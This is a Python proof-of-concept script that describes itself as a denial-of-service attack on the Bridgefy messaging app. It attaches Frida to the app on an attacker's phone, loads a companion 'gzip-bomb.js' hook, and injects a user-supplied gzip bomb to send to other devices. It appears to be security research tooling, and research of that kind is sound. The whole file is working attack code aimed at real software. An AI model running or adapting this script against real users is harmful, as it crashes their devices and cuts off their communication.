#!/usr/bin/env python3

import argparse
import frida
import sys

from pathlib import Path


def parse_args():
    parser = argparse.ArgumentParser(description='DoS attack on Bridgefy.')
    parser.add_argument('phoneid', type=str, help='The ADB ID of the attacker\'s device.')
    parser.add_argument('appid', type=str, help='The ID of the Bridgefy app.')
    parser.add_argument('file', type=str, help='The gzip bomb to send as an attacker.')
    return parser.parse_args()


def on_message(message, data):
    if message['type'] == 'send':
        print(message['payload'])
    else:
        print(message)


def main():
    args = parse_args()

    process = frida.get_device_manager().get_device(args.phoneid).attach(args.appid)

    scriptname = Path(__file__).parent / 'gzip-bomb.js'
    with open(scriptname) as f:
        script = process.create_script(f.read())

    with open(args.file, 'rb') as f:
        gzip_payload = f.read()

    print('[*] Loaded gzip payload of size', len(gzip_payload))

    script.on('message', on_message)
    script.load()

    script.post({
        'type': 'params',
        'gzipPayload': gzip_payload.hex(),
    })

    sys.stdin.read()


if __name__ == '__main__':
    main()
